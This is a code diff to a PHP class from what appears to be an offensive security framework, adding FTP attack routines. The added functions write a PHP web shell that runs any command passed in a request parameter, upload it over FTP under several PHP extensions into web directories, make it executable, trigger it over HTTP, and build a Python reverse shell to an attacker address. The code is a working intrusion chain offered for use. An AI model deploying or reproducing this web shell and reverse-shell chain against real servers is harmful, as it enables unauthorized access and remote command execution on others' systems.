@@ -24,8 +24,15 @@ class check4linux8protocol extends AUTH{
     
     
     
+    public function ftp2cmd($ftp_stream,$remote_username_ftp, $remote_userpass_ftp, $cmd){
+        $this->ssTitre(__FUNCTION__);
+        $filter = "";
+        // --follow-ftp
+        $query = "wget --ftp-user='$remote_username_ftp' --ftp-password='$remote_userpass_ftp' \"ftp://$this->ip:$this->port/\"  --follow-ftp --tries=2 --no-check-certificate -qO- 2> /dev/null   "; // --execute='$cmd' 
+        return $this->req_str($this->stream, $query, $this->stream_timeout, $filter);
+    }
     
-    public function ftp2cmd($ftp_stream,$remote_username_ftp, $remote_userpass_ftp){
+    public function ftp2shell8cmd($ftp_stream,$remote_username_ftp, $remote_userpass_ftp){
         $this->ssTitre(__FUNCTION__);
         $this->stream2info($ftp_stream);
         $this->pause();
@@ -44,18 +51,12 @@ class check4linux8protocol extends AUTH{
         
         $lprotocol = 'T' ;
         $type = "server";
-        //$this->service4lan($cmd, $templateB64_shell, $attacker_port, $lprotocol, $type);
+        $this->service4lan($cmd, $templateB64_shell, $attacker_port, $lprotocol, $type);
         
     }
     
     
-    public function ftp2shell($ftp_stream,$remote_username_ftp, $remote_userpass_ftp){
-        $this->ssTitre(__FUNCTION__);
-        $this->ftp2cmd($ftp_stream,$remote_username_ftp, $remote_userpass_ftp);$this->pause();
-        $this->ftp2keys($ftp_stream,$remote_username_ftp, $remote_userpass_ftp);$this->pause();
-        $this->ftp2upload($ftp_stream);$this->pause();
-        
-    }
+
     
     
     public function ftp2dir($ftp_stream){
@@ -66,6 +67,7 @@ class check4linux8protocol extends AUTH{
         
         
         $base = ftp_pwd($ftp_stream);
+        $tab_dir_path[] = $base;
         $this->article("PWD FTP", $base);
         
         $ftp_rawlist_racine = ftp_rawlist($ftp_stream,"-a");
@@ -99,7 +101,7 @@ class check4linux8protocol extends AUTH{
             echo "[ $dirname ] " . $dirinfo['chmod'] . " | " . $dirinfo['owner'] . " | " . $dirinfo['group'] . " | " . $dirinfo['month'] . " " . $dirinfo['day'] . " " . $dirinfo['time'] . "\n";
             if ($dirname!=="." && $dirname!==".." && !empty($dirname) ){
                 $tab_dir_path[] = $dirname;
-                $this->article("dir test", $dirname);
+                $this->article("Testing into repository", $dirname);
                 ftp_chdir($ftp_stream,  "$base/$dirname");
                 $ftp_rawlist_dir = ftp_rawlist($ftp_stream,"-a");
                 echo $this->tab($ftp_rawlist_dir);
@@ -417,31 +419,155 @@ class check4linux8protocol extends AUTH{
     }
     
     
+    public function ftp2upload2ext($ftp_stream,$remote_dirhtml){
+        $this->ssTitre(__FUNCTION__);  
+        $hashfilext = "";
+        $code = "<?php system(\$_REQUEST['cmd']);?>";
+        $hashfilename = sha1($code);
+        
+        if (empty($hashfilext)) {
+            $this->requette("echo '$code' > /tmp/$hashfilename.php" );
+            if (ftp_put($ftp_stream, "$remote_dirhtml/$hashfilename.php","/tmp/$hashfilename.php",  FTP_ASCII)) {
+                $hashfilext = "$hashfilename.php" ;
+                return $hashfilext;
+            }
+             
+        }
+        
+        if (empty($hashfilext)) {
+            $this->requette("echo '$code' > /tmp/$hashfilename.php5" );
+            if (ftp_put($ftp_stream, "$remote_dirhtml/$hashfilename.php5","/tmp/$hashfilename.php5",  FTP_ASCII)) {
+                $hashfilext = "$hashfilename.php5" ;
+                return $hashfilext;
+            }
+        }
+        
+        if (empty($hashfilext)) {
+            $this->requette("echo '$code' > /tmp/$hashfilename.PHP" );
+            if (ftp_put($ftp_stream, "$remote_dirhtml/$hashfilename.PHP","/tmp/$hashfilename.PHP",  FTP_ASCII)) {
+                $hashfilext = "$hashfilename.PHP" ;
+                return $hashfilext;
+            }
+        }
+        if (empty($hashfilext)) {
+            $this->requette("echo '$code' > /tmp/$hashfilename.php3" );
+            if (ftp_put($ftp_stream, "$remote_dirhtml/$hashfilename.php3","/tmp/$hashfilename.php3",  FTP_ASCII)) {
+                $hashfilext = "$hashfilename.php3" ;
+                return $hashfilext;
+            }
+        }
+        if (empty($hashfilext)) {
+            $this->requette("echo '$code' > /tmp/$hashfilename.PHP3" );
+            if (ftp_put($ftp_stream, "$remote_dirhtml/$hashfilename.PHP3","/tmp/$hashfilename.PHP3",  FTP_ASCII)) {
+                $hashfilext = "$hashfilename.PHP3" ;
+                return $hashfilext;
+            }
+        }
+
+        
+        if (empty($hashfilext)) {
+            $this->requette("echo '$code' > /tmp/$hashfilename.PHP5" );
+            if (ftp_put($ftp_stream, "$remote_dirhtml/$hashfilename.PHP5","/tmp/$hashfilename.PHP5",  FTP_ASCII)) {
+                $hashfilext = "$hashfilename.PHP5" ;
+                return $hashfilext;
+            }
+        }
+        if (empty($hashfilext)) {
+            $this->requette("echo '$code' > /tmp/$hashfilename.php7" );
+            if (ftp_put($ftp_stream, "$remote_dirhtml/$hashfilename.php7","/tmp/$hashfilename.php7",  FTP_ASCII)) {
+                $hashfilext = "$hashfilename.php7" ;
+                return $hashfilext;
+            }
+        }
+        if (empty($hashfilext)) {
+            $this->requette("echo '$code' > /tmp/$hashfilename.PHP7" );
+            if (ftp_put($ftp_stream, "$remote_dirhtml/$hashfilename.PHP7","/tmp/$hashfilename.PHP7",  FTP_ASCII)) {
+                $hashfilext = "$hashfilename.PHP7" ;
+                return $hashfilext;
+            }
+        }
+    }
+    
+    public function ftp2upload4exec($ftp_stream,$http_open,$remote_dirhtml,$remote_fileExt){
+            $this->ssTitre(__FUNCTION__);        
+            $this->ftp2files($ftp_stream);
+            $this->article("working on Directory", $remote_dirhtml);
+            ftp_chmod($ftp_stream, 0777, "$remote_dirhtml/$remote_fileExt");
+            $this->ftp2files($ftp_stream);
+            //$this->net("http://$this->ip/$remote_fileExt?cmd=id");//$this->pause();
+            $query = "wget  \"http://$this->ip:$http_open/$remote_fileExt?cmd=id\" --tries=2 --no-check-certificate -qO- 2> /dev/null   ";
+            sleep(3);
+            $this->requette($query);
+            $this->pause();
+            
+            
+            $template_shell = "wget --user-agent='$this->user2agent' \"http://$this->ip:$http_open/$remote_fileExt?cmd=%SHELL%\" --tries=2 --no-check-certificate -qO- 2> /dev/null   ";
+            $templateB64_shell = base64_encode($template_shell);
+            $attacker_ip = $this->ip4addr4target($this->ip);
+            $attacker_port = rand(1024,65535);
+            $shell = "/bin/bash";
+            $cmd_rev  = $this->url2encode($this->rev8python($attacker_ip, $attacker_port, $shell));
+            $cmd = str_replace("%SHELL%", $cmd_rev, $template_shell);
+            
+            $lprotocol = 'T' ;
+            $type = "server";
+            //$this->service4lan($cmd, $templateB64_shell, $attacker_port, $lprotocol, $type);        
+    }
+    
     public function ftp2upload($ftp_stream){
         $this->ssTitre(__FUNCTION__);
-        
+        $hashfilext = "";
         $http_ports = $this->ip2ports4service("http");
         foreach ($http_ports as $http_open)
             if(!empty($http_open)) {
+                
+                $hashfilext = $this->ftp2upload2ext($ftp_stream, ".");
+                if (!empty($hashfilext)){
+                    $this->ftp2upload4exec($ftp_stream,$http_open,".",$hashfilext);
+                }
+                
+                $this->pause();
+                
                 $tab_dir = $this->ftp2dir($ftp_stream);
                 foreach ($tab_dir as $dir){
-                    if (strstr($dir, "/var/www/html")!==FALSE){
+                    
+                    if (stristr($dir, "html")!==FALSE){
                         $this->log2succes("Found WebServer repository ");
+                        $hashfilext = $this->ftp2upload2ext($ftp_stream, $dir);
+                        $this->ftp2files($ftp_stream);
                         
-                        $this->requette("echo '<?php system(\\\$_REQUEST[\"cmd\"]);?>' > /tmp/system_request.php " );
-                        ftp_put($ftp_stream, "/tmp/system_request.php", "$dir/system_request.php", FTP_ASCII);
-                        $template_shell = "wget --user-agent='$this->user2agent' \"http://$this->ip:$http_open/system_request.php?cmd=%SHELL%\" --tries=2 --no-check-certificate -qO- 2> /dev/null   ";
-                        $templateB64_shell = base64_encode($template_shell);
-                        $attacker_ip = $this->ip4addr4target($this->ip);
-                        $attacker_port = rand(1024,65535);
-                        $shell = "/bin/bash";
-                        $cmd_rev  = $this->url2encode($this->rev8sh($attacker_ip, $attacker_port, $shell));
-                        $cmd = str_replace("%SHELL%", $cmd_rev, $template_shell);
-                        
-                        $lprotocol = 'T' ;
-                        $type = "server";
-                        $this->service4lan($cmd, $templateB64_shell, $attacker_port, $lprotocol, $type);
+                        if (!empty($hashfilext)){
+                            $this->ftp2upload4exec($ftp_stream,$http_open,$dir,$hashfilext);
+                        }
                     }
+                    else {
+                        $dir_html = "/var/www/html";
+                        $this->note("not found WebServer repository: $dir_html ");
+                        
+                        if (ftp_chdir($ftp_stream, $dir_html)){
+                            $hashfilext = $this->ftp2upload2ext($ftp_stream, $dir_html);
+                                                       
+                            $this->ftp2files($ftp_stream);
+                            
+                            if (!empty($hashfilext)){
+                                $this->ftp2upload4exec($ftp_stream,$http_open,$dir_html,$hashfilext);
+                            }
+                        }
+                        else {
+                            $this->rouge($dir);
+                            
+                                $hashfilext = $this->ftp2upload2ext($ftp_stream, $dir);
+                                $this->article("locate FILE", $hashfilext);
+                                $this->pause();
+                                $this->ftp2files($ftp_stream);                                
+                                if (!empty($hashfilext)){
+                                    $this->ftp2upload4exec($ftp_stream,$http_open,$dir,$hashfilext);
+                                    $this->pause();
+                                }
+                            }
+                        }
+                        
+                    
                 }
                 
             }
